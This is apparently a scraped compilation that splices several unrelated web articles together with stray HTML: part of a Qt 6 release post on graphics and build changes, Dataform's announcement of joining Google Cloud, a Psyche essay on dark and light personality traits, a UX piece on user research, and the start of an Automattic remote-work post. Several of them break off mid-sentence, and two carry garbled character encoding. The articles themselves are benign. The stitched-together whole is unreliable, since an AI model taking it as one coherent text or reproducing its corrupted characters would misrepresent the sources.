<p><img src="https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=367&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png" width="367" alt="New graphics architecture in Qt 6" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=184&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 184w, https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=367&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 367w, https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=551&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 551w, https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=734&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 734w, https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=918&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 918w, https://www.qt.io/hs-fs/hubfs/image-png-Nov-03-2020-07-47-23-41-AM-png-2.png?width=1101&amp;name=image-png-Nov-03-2020-07-47-23-41-AM-png-2.png 1101w" sizes="(max-width: 367px) 100vw, 367px"></p>
<p><span>So while Qt 5 relied on OpenGL for hardware-accelerated graphics, the picture completely changes with Qt 6. All of our 3D graphics in Qt Quick is now built on top of a new abstraction layer for 3D graphics called RHI (Rendering Hardware Interface). RHI makes it possible for Qt to use the native 3D graphics API of the underlying OS/platform. So Qt Quick will now use Direct3D on Windows and Metal on macOS by default. For details, have a look at the <a href="https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d" rel="noopener">blog post series about the RHI</a>.</span><span>&nbsp;</span></p>
<p><span>The OpenGL specific classes in Qt still exist, but are now moved out of QtGui in the <a href="https://doc.qt.io/qt-6/qtopengl-index.html" rel="noopener">QtOpenGL</a> module. We also added a new module called <a href="https://doc.qt.io/qt-6/qtshadertools-index.html" rel="noopener">QtShaderTools</a> to deal with the different shading languages of those APIs in a cross-platform way.</span></p>
<h3><span>Qt Quick 3D and Qt 3D</span></h3>
<p><span>Qt Quick 3D is a relatively new module. It seamlessly extends Qt Quick with 3D capabilities. With Qt Quick 3D, our focus was to create an API that is as easy to use as the existing parts of Qt Quick (for 2D user interfaces) while providing full support for creating complex 3D scenes. The main goal behind this effort has been to enable seamless integration between 2D and 3D content.</span><span></span></p>
<p><span>This module has seen significant improvements with Qt 6 that we wouldn’t have been able to do in the Qt 5 series. Most importantly it is now always using the RHI abstraction layer to make optimal use of the underlying graphics API and Hardware. Additionally, it now features a much deeper and more performant integration between 2D and 3D content, allowing you to place 2D items into a 3D scene. It also has vastly improved support for glTF2 and physics-based rendering, making it trivial to import assets created in other design tools. There are many other major improvements in the module, a more in-depth description can be found in a <a href="https://www.qt.io/blog/what-is-new-in-qt-quick-3d-6.0" rel="noopener">separate blog post</a>.</span></p>
<p><span>Qt 3D is now also based on top of the RHI abstraction layer, has seen some performance improvements and cleanups. You can find more details in two blog posts by our partner KDAB (<a href="https://www.kdab.com/qt-3d-changes-in-qt-6/" rel="noopener">here</a> and <a href="https://www.kdab.com/qt3d-renderer-qt6/" rel="noopener">here</a>).</span></p>
<h3><span>Desktop styling for Qt Quick</span></h3>
<p><span><img src="https://www.qt.io/hubfs/Qt%206%20Desktop%20Styling-png.png" alt="Desktop Styling in Qt 6"></span></p>
<p><span>When we created the set of controls for Qt Quick, our focus was to make them lightweight and performant. For that reason, they did not support desktop styling in Qt 5. However, in Qt 6, we found a way to make them look &amp; feel native on desktop operating systems. With 6.0, Qt Quick now supports native styling on both macOS and Windows. See this <a href="https://www.qt.io/blog/desktop-styling-with-qt-quick-controls" rel="noopener">blog post for details</a>.</span><span> Native look &amp; feel for Android and Linux already existed with the Material and Fusion styles in Qt 5. We are improving those for future Qt releases and are also planning to implement a native style for iOS.</span></p>
<h3><span>Interfacing with platform specific functionality</span></h3>
<p><span>Even with Qt offering most functionality required to develop your application platform-independently, there is sometimes a need to interface with platform-specific functionality. In Qt 5, we provided a set of add-on modules (QtX11Extras, QtWinExtras, QtMacExtras) to help with this purpose. But this full separation from the rest of Qt has led to a couple of architectural issues, inconsistencies and code duplication within Qt. In Qt 6, we made an effort to clean this up and fold the functionality offered by those add-on modules into platform specific APIs offered directly in Qt. This will make interfacing with OS/platform-specific APIs much easier in Qt 6. Have a look <a href="https://www.qt.io/blog/platform-apis-in-qt-6" rel="noopener">here</a>&nbsp;for more details.</span></p>
<h3><span>Build system and&nbsp;</span><span>Packaging</span></h3>
<p><span><img src="https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=189&amp;name=600px-Cmake-svg-png.png" width="189" srcset="https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=95&amp;name=600px-Cmake-svg-png.png 95w, https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=189&amp;name=600px-Cmake-svg-png.png 189w, https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=284&amp;name=600px-Cmake-svg-png.png 284w, https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=378&amp;name=600px-Cmake-svg-png.png 378w, https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=473&amp;name=600px-Cmake-svg-png.png 473w, https://www.qt.io/hs-fs/hubfs/600px-Cmake-svg-png.png?width=567&amp;name=600px-Cmake-svg-png.png 567w" sizes="(max-width: 189px) 100vw, 189px"></span></p>
<p><span>We also made some considerable changes in how we build and distribute Qt.&nbsp; Worth mentioning is that Qt 6 itself is now <a href="https://www.qt.io/blog/qt-6-build-system" rel="noopener">built using CMake</a>. This has also led to significant improvements for all our users that use CMake to build their projects. We will continue to support qmake for the lifetime of Qt 6, so there is no need to make any changes to your build system if you're using it, but we recommend to use CMake for all new projects.</span></p>
<p><span>Qt 6 also comes with a much smaller default package, and many of the add-ons are now distributed as separate packages through a package manager. This gives us more flexibility in adapting release schedules of add-ons to market requirements, allowing, for example, for more frequent feature releases as the core Qt packages or making them available for multiple Qt versions at the same time. In addition, we can use the package manager as a delivery channel for 3rd party content. And finally, it gives our users more flexibility as they can choose to download only what they really need. </span></p>
<p><span>Currently, we are using the existing Qt …</span></p></span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Today we're excited to announce that we've joined Google Cloud. Over the course of the past several months, our partnership with Google Cloud has deepened and we believe that our new combined efforts can make our customers and partners even more successful.</p><div><div><p>To our customers, users, supporters and contributors - today, we are extremely excited to share that Dataform is joining Google Cloud!</p>
<p>Before we jump into the story, let us quickly answer what we think will be the most important questions for existing and new users:</p>
<ul>
<li>Dataform Web will continue to be run and maintained by us, as part of Google Cloud.</li>
<li>Dataform Web will be free for all new users as of today, December 8th 2020.</li>
<li>Existing customers will be transitioned onto the free plan immediately.</li>
<li>Dataform Web will focus on support for BigQuery going forward.</li>
<li>Weâ€™ll be working closely with the rest of the Google Cloud Data Analytics team over the next year to deliver our vision for Dataform within Google Cloud.</li>
</ul>
<p>Three years ago we started Dataform with a mission to <strong>empower analysts to manage the entire flow of data in the warehouse, using a single, unified workflow</strong>. Throughout our journey weâ€™ve been focused on giving data analysts and data engineers the tools they need to take raw, messy data, transform it, and put it into the hands of their organization. Weâ€™ve only just scratched the surface of this problem and solving it will continue to be our core mission and focus going forward.</p>
<p>Weâ€™ve followed Googleâ€™s products and successes within analytics closely over the past few years, and always felt that they were a product leader when it came to cloud data warehousing, SQL, and now business intelligence; with products such as Looker that inspired us significantly in our own journey. After several conversations with the Google Cloud team it became clear that we are deeply aligned on the importance of serving analysts with the right tools and technology in order to fill what we all perceive as a missed opportunity in existing solutions.</p>
<p>At the same time, as a team of just 7, in a complex, competitive and rapidly changing market, we had more ideas than we had people or resources to accomplish. There has always been so much more we wanted to do each quarter than we could achieve. With the support of the BigQuery and Cloud Analytics teams and our combined thought leadership and efforts, we felt that together we could achieve something bigger than we could separately.</p>
<p>There will inevitably be some changes to the product and how we operate over the coming years, but one thing that will not change is our commitment to the principles that we feel have gotten us this far: working closely with our customers, making sure we continue to collect and act upon your feedback, and a laser focus on doing one thing and doing it well.</p>
<p>At Dataform we always felt we were delivering a unique and innovative product to our customers and the data community. With Googleâ€™s support, we have even more confidence in our ability to build and deliver a product that can truly change the way that all companies, large and small, work with data. </p>
<p>In the coming months weâ€™ll be able to share more details of our product roadmap. In the meantime please reach out to us if you have any questions. Thank you again for joining us on this journey. Weâ€™re uncomfortably excited about what we can accomplish together over the coming years!</p>

December 8, 2020 | https://psyche.co/ideas/are-people-with-dark-personality-traits-more-likely-to-succeed | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/are-people-with-dark-personality-traits-more-likely-to-succeed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>â€˜Darkâ€™ personalities come in</strong> various shades, but at the core of all of them is a tendency to callously use others for personal gain. What is it that these types of people are really gaining, though? Might a benevolent approach to life and others be even more advantageous?</p>
<p>For <span>15 years,</span> research into dark personality traits (including narcissism, psychopathy and Machiavellianism) has been rapidly <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/spc3.12018" rel="nofollow noreferrer noopener">expanding</a>. We now know that these traits are far more <a href="https://europepmc.org/article/med/32484407" rel="nofollow noreferrer noopener">evident</a>, on average, in men than women. We know that <a href="https://pubmed.ncbi.nlm.nih.gov/19243821/" rel="nofollow noreferrer noopener">approximately</a> <a href="https://psycnet.apa.org/record/2008-13625-018" rel="nofollow noreferrer noopener"><span>1-2 per cent</span></a> of individuals in the general population display extremely dark personality features â€“ enough to meet the clinical threshold for a personality disorder â€“ and about <span>10-20 per</span> cent of individuals <a href="https://pubmed.ncbi.nlm.nih.gov/22996170/" rel="nofollow noreferrer noopener">have</a> moderately elevated levels. We know that even people with moderate levels of dark traits can wreak havoc: they are more likely to <a href="https://journals.sagepub.com/doi/10.1177/1745691616666070" rel="nofollow noreferrer noopener">lie and cheat</a>, show <a href="https://www.sciencedirect.com/science/article/pii/S0191886920305468" rel="nofollow noreferrer noopener">racist</a> attitudes, and be <a href="https://psycnet.apa.org/record/2014-04417-005" rel="nofollow noreferrer noopener">violent</a> towards others.</p>
<p>As researchers, we have studied these traits ourselves. But in a bid to balance out the extensive literature on dark traits, we have recently started to <a href="https://www.frontiersin.org/articles/10.3389/fpsyg.2019.00467/full" rel="nofollow noreferrer noopener">focus</a> on the light side of human personality instead â€“ the â€˜everyday saintsâ€™ among us. These people are genuinely interested in others and treat them well without question, not as a means to an end. They applaud the success of others, believe in the fundamental goodness of humans, and respect the dignity of everyone. Our recent <a href="https://www.sciencedirect.com/science/article/pii/S019188692030310X" rel="nofollow noreferrer noopener">study</a> of more than 36,000 adults suggests that these traits are common: around <span>30-50 per cent</span> of people show prominent light personality trait profiles, depending on world region, and these traits are particularly common in women.</p>
<p>We wanted to understand which personality profile â€“ dark or light â€“ leads to more success and happiness in the long run. There is an oft-touted saying that â€˜Nice guys finish lastâ€™ and, on the face of it, this might seem correct. If youâ€™re always expending your energy caring about others, perhaps youâ€™re bound to get left behind. If youâ€™re willing to deceive and exploit others without worrying about their feelings, you can look after â€˜number oneâ€™ and rise faster to the top. But does the research back this up?</p>
<p>Experimental studies support the idea of a â€˜successfulâ€™ dark personality, but only up to a point. One <a href="https://psycnet.apa.org/record/2015-11168-026" rel="nofollow noreferrer noopener">study</a> found that people with psychopathic personality traits win more points on a negotiation task where they are required to compete with a partner, but fewer points on a task that involves cooperation. Those with dark traits are <a href="https://link.springer.com/article/10.1007%2Fs12144-018-9823-9" rel="nofollow noreferrer noopener">more</a> likely to â€˜defectâ€™ in the classic Prisonerâ€™s Dilemma task â€“ an approach that means maximising your own outcome while duping the other participant.</p>
<p>But their success in the real world is questionable. In corporate settings, those with dark personality traits are slightly more likely to <a href="https://psycnet.apa.org/record/2018-51219-001" rel="nofollow noreferrer noopener">emerge</a> as leaders and are seen as <a href="https://onlinelibrary.wiley.com/doi/abs/10.1002/bsl.925" rel="nofollow noreferrer noopener">charismatic</a> but, when it comes to getting the job done, they tend to achieve less and are considered poor team players. Our recent study also found that political figures with dark personality traits are more likely to get elected and hold their positions, but other studies <a href="https://journals.sagepub.com/doi/abs/10.1177/0956797615611922" rel="nofollow noreferrer noopener">show</a> that they are much poorer at getting legislation passed. Hedge fund managers with these traits generally <a href="https://journals.sagepub.com/doi/abs/10.1177/0146167217733080" rel="nofollow noreferrer noopener">obtain</a> significantly lower financial returns on the investment funds they manage. Overall, individuals with dark traits <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Fa0025679" rel="nofollow noreferrer noopener">engage</a> in more counterproductive work behaviour, such as theft and abusive supervision. Perhaps unsurprisingly, they donâ€™t end up with higher average incomes than their peers with light personalities.</p>
<p>Through deceitful manipulation and callous use of others, these individuals are cutting off the very (social) branch theyâ€™re sitting on</p>
<p>On top of this, those with dark personality traits donâ€™t have much luck outside of work. Even if they manage to avoid prison (imprisonment being a <a href="https://pubmed.ncbi.nlm.nih.gov/18837606/" rel="nofollow noreferrer noopener">high</a> possibility for those with extreme traits), they are at increased risk of <a href="https://pubmed.ncbi.nlm.nih.gov/19243821/" rel="nofollow noreferrer noopener">suicide</a> and <a href="https://pubmed.ncbi.nlm.nih.gov/28556964/" rel="nofollow noreferrer noopener">violent death</a>. They are also not particularly happy: people with dark traits tend to report poor self-image, an inability to intimately connect with others, and little life satisfaction. In contrast, we found that those with light personality trait profiles have fulfilling, intrinsically rewarding lives: they generally have a more positive view of themselves, more positive connections with others and find life more satisfying.</p>
<p>The key factor here seems to be empathy: the capacity to resonate with â€“ and understand the perspective of â€“ the emotional experiences of others. Individuals with light personality traits show a great deal of empathy for others, while those with dark personality traits tend to show very little. In our new research, we found that this seems to be what leads to a more satisfying life. Similarly, being prosocial â€“ acting kindly, cooperatively and with compassion toward others â€“ is also significantly <a href="https://psycnet.apa.org/record/2020-65092-001" rel="nofollow noreferrer noopener">linked</a> with higher wellbeing.</p>
<p>As a species, weâ€™re fundamentally built for social connectedness, and we depend on cooperation and <a href="https://www.aeaweb.org/articles?id=10.1257/jep.14.3.137" rel="nofollow noreferrer noopener">trust</a>. When those with dark personalities try to take advantage of this for their own personal gain, they do so at their own peril. In essence, through deceitful manipulation and callous use of others, these individuals are cutting off the very (social) branch theyâ€™re sitting on. While those with dark traits might initially capture the attention of others, their social behaviour ultimately leads to limited success in work or politics, and little satisfaction with their lives.</p>
<p><strong>So far, we have</strong> made it seem as though people fall into one of two binary groups: dark or light. But in reality, thereâ€™s a third group: we found that about <span>40 per cent</span> of individuals show a balance of dark and light traits. People in this mixed group are similar to the light group when it comes to critical variables involving empathy and social connectedness, but they still show some dark tendencies â€“ hampering their relationships to some degree with deceitful, self-absorbed or hurtful behaviour toward others.</p>
<p>Some might think that the mixed group is the optimal place to be: youâ€™re able to have some connection with others, but wonâ€™t be taken as a pushover. But compared with those with a light personality, mixed individuals have lower levels of life satisfaction and a less positive self-image. It seems that the mixed group are on the way to the light personality profile, so to speak, but fall short of the full expression â€“ and the added dark traits are whatâ€™s holding them back.</p>
<p>As people age â€“ particularly from 30 to 40 â€“ they become more likely to display light personality trait profiles</p>
<p>Regardless of where you fall on these dimensions of personality, we <a href="https://scottbarrykaufman.com/books/transcend/" rel="nofollow noreferrer noopener">believe</a> in the fundamental ability to grow and change. Large-scale studies have <a href="https://doi.apa.org/doiLanding?doi=10.1037%2Fa0024950" rel="nofollow noreferrer noopener">documented</a> that your general personality (eg, neuroticism, extraversion, conscientiousness) continues to change throughout your lifetime, and weâ€™ve found the same to be true when it comes to light and dark traits.</p>
<p>Specifically, we found that the extent to which you exhibit light or dark personality traits tends to shift as you get older. As people age â€“ particularly as they progress from 30 to 40 â€“ they become more likely to display light personality trait profiles. Other <a href="https://content.apa.org/record/2014-34008-001" rel="nofollow noreferrer noopener">research</a> has shown that moral character traits, such as conscientiousness and self-control, are generally more common in older people. Age doesnâ€™t completely account for the results â€“ younger people can display light personality traits â€“ but the research suggests that what can fundamentally differentiate light and dark profiles is a process of psychological maturation.</p>
<p>We are <a href="https://journals.sagepub.com/doi/10.1177/0963721417734875" rel="nofollow noreferrer noopener">born</a> with an innate sense of fairness, though this is a limited ability. Thus, like language, it is a skill that requires further development. Our research, and studies of our closest relatives, nonhuman primates, both show that moral behaviour can emerge and change across development â€“ in large part through cooperative social interactions. Thus, by embracing and trusting social connections, we can progress toward a light personality trait profile â€“ a pathway that appears to lead to healthy self-actualisation and even transcendence.</p>
<p>If youâ€™re curious about where you fall on the light vs dark personality spectrum, you can answer the <a href="https://scottbarrykaufman.com/lighttriadscale/" rel="nofollow noreferrer noopener">questions</a> we used in our study. We have now tested more than 250,000 individuals from across the globe, and you can see how your responses compare with the average. And remember, there is always scope for change: we believe in the fundamental ability to grow and transcend self-centredness through deliberate and sustained changes in our patterns of behaviour and thinking.</p>
<p>The most important thing is to <em>want</em> to change. Unfortunately, most people with extreme levels of dark personality traits donâ€™t want to change who they are. Despite not being particularly happy with their lives, they remain fixated on what they think they need: more and more power, wealth and domination over others.</p>
<p>Of course, some days weâ€™re all motivated to shut out other people, and simply look out for ourselves. This can be especially true when it seems that those who cheat, deceive and take advantage of others are somehow getting ahead. But rest assured that this doesnâ€™t seem to be the case. We have found that being empathic and connected to others â€“ capitalising on our fundamentally social nature â€“ is ultimately the pathway to a more rewarding life.</p></div></div></div>]]>

<p>Meet Maria.</p>

<p>She’s sitting at her desk, thinking about the design project she launched a few weeks ago.</p>

<p>Maria is a talented designer. She has good intuition and a solid understanding of design principles.</p>

<p>But her latest project hasn’t gone off well. There have been more customer complaints than usual. And what’s worse, the complaints have turned out to be completely valid. She’s already had to redesign a few things. And this isn’t the only time this has happened.</p>

<p>Lately, Maria has been hearing a lot about user research: user interviews, journey maps, usability testing, and so on. This is all new to her, but Maria’s gut is telling her it might be part of the answer to her problems.</p>

<p>She wonders if she should make the effort to add user research into her process.</p>

<p>Is it worth it? What should Maria (and <em>cough</em> you) do?</p>

<p>In this article, we’ll dive into the answer.</p>

<h2 id="whats-first">What’s first?</h2>

<p>You can come at UX design from lots of different directions.</p>

<p>There’s <strong>aesthetics-first</strong>. That’s when the designer’s whole goal is to make something that looks appealing. There’s lots of that on the web.</p>

<p>There’s <strong>company-first</strong>. That’s when design decisions are based on business metrics, and everything else is set aside. As a user, you can feel when this is the case, and it can lead to issues like dark patterns.</p>

<p>There’s <strong>designer-first</strong>. This one’s trickier to spot. It’s when the designer bases everything on <em>their</em> intuition and what <em>they</em> want the product to be. It’s grounded on the talent and opinion of whomever the designer happens to be.</p>

<p>Then there’s <strong>user-first</strong>. This is when decisions stem from the problems, preferences, and needs of the product’s end user.</p>

<p>In my view, user-first is the best way to go.</p>

<p>A digital product exists because it provides value to a user. So serving that user is in the best interest of all involved, including the business and the designer.</p>

<p>That is the scenario in which all parties win. And it leads to the best design result because design isn’t decoration<span>—</span>it’s problem solving.</p>

<blockquote>
  <p>“People ignore design that ignores people.” - <a href="https://frankchimero.com/" target="_blank">Frank Chimero</a></p>
</blockquote>

<p>Let’s be clear: <strong>there is nothing wrong with aesthetics, or business goals, or the designer</strong>. Those are all essential pieces to the puzzle. We don’t want to over-prioritize to the point where the business suffers. That’s counter-productive.</p>

<p>What I’m saying is the <em>foundation</em> should be users<span>—</span>they should be at the heart of every design decision from the very beginning. It starts and ends with them because your business starts and ends with them.</p>

<h2 id="heres-the-bigger-point">Here’s the bigger point</h2>

<p>What I’ve described above is becoming widely adopted across companies of all sizes and industries. It makes sense. Maria would agree. Chances are you would, too.</p>

<p><strong>But here’s the thing that Maria and lots of other people don’t realize</strong>—and if you take away one thing from this article, it should be this:</p>

<p>If you want to build in a user-first way, it’s not enough to try to be empathetic and imagine yourself in your user’s shoes. No matter how talented you are as a designer, no matter how good your intuition is, no matter how well you understand design principles, you will <em>always</em> need tools and techniques to get there. In other words:</p>

<blockquote>
  <p>User research is the only path to real user-first design.</p>
</blockquote>

<p>This is, after all, why the tools and techniques of user research exist in the first place. They were specifically created to put the user at the core of our designs.</p>

<h2 id="why-is-this">Why is this?</h2>

<p>Let’s look at six reasons why user research is fundamental to user-first design.</p>

<h3 id="it-helps-you-get-over-yourself">It helps you get over yourself</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/you-are-not-your-user.svg" alt="You are not your user">
</figure>

<p><a href="https://www.sciencedirect.com/science/article/abs/pii/002210317790049X?via%3Dihub" target="_blank">The false consensus effect</a> causes people to “see their own behavioral choices and judgments as relatively common and appropriate.” In UX this means you think your thoughts, beliefs, and actions are the same as your user.</p>

<p>This is a trap.</p>

<p>For example, let’s say you’re a designer at Strava. Running is your biggest hobby, and you use Strava to track everything.</p>

<p>Does this mean you are the user and therefore don’t need to do any research? No, because you are not a <em>normal</em> user.</p>

<p>You know too much about technology and you <em>definitely</em> know too much about your project. <strong>You’re too close to it.</strong> You think about it through a different lens. And you can’t take all this stuff out of your brain and set it aside while you’re designing.</p>

<p>Our knowledge and experience keep us from seeing things through the eyes of our users. And the only way to get past that is via research and testing.</p>

<p>It’s easy to forget these concepts and get caught up in our own minds. I’ve done it lots of times.</p>

<p>But anything you put out into the world without user research is simply guesswork. <strong>Even the most well thought out designs are just assumptions until they are verified by real data and end users.</strong></p>

<p>Let’s aim for groundwork, not guesswork. Let your users point the way.</p>

<h3 id="it-unlocks-valuable-data">It unlocks valuable data</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/user-research-data.svg" alt="User research unlocks data">
</figure>

<p>Research opens the door to hard facts. You’re no longer making decisions based on hunches. You can validate and verify your designs with empirical data.</p>

<p><a href="https://www.nngroup.com/articles/guesses-vs-data/" target="_blank">Even a tiny amount of data</a> vastly improves the probability of making the correct design decision.</p>

<p>And here’s the thing: this data is out there, ready for the taking. But you’re walled off from it until you perform research.</p>

<p>Learn how to put your assumptions aside, do research, and ask the right questions, and the data is yours.</p>

<h3 id="its-feasible-for-anyone">It’s feasible for anyone</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/user-research-feasible.svg" alt="User research is feasible for anyone">
</figure>

<p>User research doesn’t have to be big, long, complex, or expensive.</p>

<p>In the past, there’s been a false belief that all user research has to be a fully-fledged psychology experiment where a team of Ph.D.’s with an enormous budget perform mind-numbing investigations in a formal lab.</p>

<p><strong>But in the real world, user research can (and should) be light and fast.</strong> Research tools and techniques have evolved along with technology, and you can change the cost and scale to meet your specific needs. It can be integrated into even fast-moving projects.</p>

<p>For example, prototypes are easy and cheap to make. And a very effective usability test can be done in a couple of days.</p>

<h3 id="its-efficient">It’s efficient</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/user-research-saves-time.svg" alt="User-research-saves-time">
</figure>

<p>What research does is help you understand what the user wants right now, instead of later via support complaints (like Maria). You identify red flags, opportunities, and user reactions in advance. You discover what works and what doesn’t upfront so you can course-correct and iterate quickly, before putting time into the final product.</p>

<p>With each round of testing, analysis, and prototyping, the design improves based on hard facts about what works and what doesn’t. Your design and development teams don’t waste time creating something that won’t satisfy the people using it. They create efficiently, building in a direction that is much more certain to succeed.</p>

<p>In short, <strong>you match your designs to real-world use so that you get to the ideal version the first time.</strong> It saves you the costly design and development time that comes from having to deploy rebuilds and fixes.</p>

<h3 id="its-economical">It’s economical</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/user-research-saves-money.svg" alt="User research saves money">
</figure>

<p>User research is an investment. It’s part of the long-game of creating a great digital product. It pays off with multiple gains (including monetary) over time.</p>

<p>One of the biggest ways you save money is by fixing UX problems before they ever happen. Think about the costs associated with development hours, or with an issue identified late in the game that has to be corrected quickly and retroactively.</p>

<p>Research also strengthens a product’s potential to succeed. <strong>Products that win are those that help users accomplish what they want in a better way than competitors.</strong> UX directly affects metrics like conversion rates, adoption rates, customer loyalty, and growth. And more success means more revenue.</p>

<h3 id="its-convincing-motivating-and-unifying">It’s convincing, motivating, and unifying</h3>

<figure>
    <img src="https://learnuxd.io/img/posts/user-research-worth/user-research-convincing-motivating.svg" alt="User research is convincing and motivating">
</figure>

<p>This is because research…</p>
<ul>
  <li><strong>Is not from you</strong>. It’s from a third party, your user<span>—</span>the most important third party of all.</li>
  <li><strong>Is based on real results and data, not hunches</strong>. It can be hard to get behind someone’s opinion, but everyone can get behind numbers.</li>
  <li><strong>Allows you to measure things,</strong> compare between options, and validate your decisions.</li>
</ul>

<p>You, your team members, and your superiors can all have confidence that you’re making the right decision when you perform research. You’re not basing it on a gut feeling or someone’s personal opinion. This aligns everyone<span>—</span>it builds consensus.</p>

<p>For example, imagine showing your team a video recording of a usability test with a real person who’s struggling to complete a task with your product. Everyone in that room will walk away knowing it’s a problem and motivated to make the required changes.</p>

<h2 id="what-this-looks-like">What this looks like</h2>

<p>Let’s get back to Maria. That day at her desk she resolved she would make a serious effort to start using research.</p>

<p>Over the next year, she picked up one skill here, another there. It wasn’t perfect. In fact, it was a bit messy sometimes, and she still has a lot to learn.</p>

<p>But it’s slowly becoming part of her process. She’s using techniques like user interviews, empathy maps, and card sorting. She’s building user flows and prototypes and doing usability testing with them.</p>

<p>At first, it was hard to get her coworkers on board with the importance of this stuff. But over time, both Maria and her team have begun to see the benefits.</p>

<p>She’s finding that communication and decision-making are more simple. It’s getting easier and easier to come to a consensus about what the team should do because they have real data to back it up.</p>

<p>They’re spending less time on redesigns and fixes, and more time on new features.</p>

<p>There are fewer complaints and more praise from users. They’re seeing a healthy number of new users and retention.</p>

<p>Are there still issues and mistakes? Of course. There are just fewer of them.</p>

<p>Maria’s happy with where things are headed. She’s more confident with the designs she’s putting out and most of all, she has clear data that confirms it’s a better user experience.</p>

<h2 id="tying-things-off">Tying things off</h2>

<p>Compared to other design professions, UX has a myriad of tools that make it quick and easy to get …</p></div></div>

		<div>

			
<p>This past September, I crossed 6 years of working for <a href="https://automattic.com/">Automattic</a>, the parent company of WordPress.com, Tumblr, and more. I love talking about Automattic and the unique culture that has made our distributed company work across 70+ countries for the last 15 years. The more I talk with people, the more I realized that it’s equally as valuable to share aspects of our culture that might be a turn off for people looking to work here. This feels particularly true with remote work on the rise and more options opening up. To pull back the curtain, I thought I’d take some time to share aspects of working for Automattic that might not be for everyone. On the flip side, if you find yourself reading this and feeling even more excited to work here, <a href="https://automattic.com/work-with-us/">I hope you apply</a>.&nbsp;</p>



<hr>



<p><strong>Working remotely &amp; navigating isolation</strong></p>



<p>This is an obvious one to get out of the way but I mention it as some people still miss that Automattic is a fully distributed company without offices, requirements to come into the office, etc. Outside of these pandemic times, we do tend to meet up a few times a year for in person time but the rest is spent connecting from afar. You can read more about our approach to social communication <a href="https://automattic.com/social-communication/">here</a> as well. Generally speaking, while it can be isolating, it doesn’t have to be but does require effort for that to be the case.</p>



<p><strong>Comprehensive hiring process (that we work to make enjoyable)</strong></p>



<p>Our hiring process varies slightly by role but can be nicely seen in this <a href="https://automattic.com/work-with-us-old/how-we-hire-developers/">description of the developer hiring process</a>. It generally involves an interview, a test of some sort, a paid trial, and a final offer conversation. Because we do ask for so much from applicants, we make sure it’s flexible and fits around your life. This might mean your hiring process can take a few months or a few weeks depending on your availability and the trial task. Speaking personally, when I first applied to be a Happiness Engineer, the hiring process took a few months in 2014. Fast forward to 2020, I applied internally to be a Developer Relations Wrangler and had everything wrapped up in a few short weeks including a 10 day trial. Ultimately, the hiring process is comprehensive both so you can get a feel for Automattic including the work you’d be doing and so we have real time to get a feel for you. This might be a deal breaker if you’re looking for a more rapid, less intense hiring process. Our hope is that it actually helps better determine mutual fit.&nbsp;</p>



<p><strong>Vast amount of reading/writing</strong>&nbsp;</p>



<p>Most of our company communication is done on what we call “p2s”. You can actually create your own <a href="https://wordpress.com/p2/">here</a>. Think of them as free flowing, chronological sites where people can share updates, tag others for feedback, cross post to other p2s, and more. I’m on the more talkative and connected side of things which is reflected in the stats you see below (almost at the 1.5 million word mark!):&nbsp;&nbsp;</p>



<figure><img src="https://lh4.googleusercontent.com/HM0y0zLKfFZ_DlcsXm9mReu1d_2HHO_gPYfk-PXT-IWn8QzqbdSL4xB9O7_5NXDpkafd81rct48HNqcHUeHreKGoqTIXtRkJRCDDUe2BlbrDy4KqMPCgVyVJyh9fEw8dpwjh_JUp" alt=""></figure>



<p>I personally love being able to read my way across the company seeing new ideas come to life, thoughtful discussions taking place, and more. It feels like being able to pop my head into any meeting I want and soak up the knowledge in the room including sometimes asking questions as I go. Add in slack where I can see conversations live and I can hardly get enough. For others, this can feel like drowning in information overload with no escape. While not all Automatticians are as in touch on the p2s, there is a level of reading and communicating that is required to be up to speed and to do your job effectively remotely. This isn’t for everyone!</p>



<p><strong>Free flowing structure of teams</strong>&nbsp;</p>



<p>During a 9 month stint helping with hiring, a common question I heard was “But what team will I be working on?” At Automattic, we have a VERY free flowing structure of teams and this is part of why we don’t hire for teams but for roles. This shows up even in team namings with most teams picking a more whimsical name over a descriptive one knowing that the team responsibilities will morph in the months to come. If you’re someone who likes to work on one team with a very clear mandate for years into the future, Automattic could be tricky for you as the free flowing nature is what helps us adapt. This doesn’t mean that you won’t work for years on a single focus (some do) but that the team you’re on will likely evolve.&nbsp;</p>



<p><strong>Reliance on async communication to get things done</strong></p>



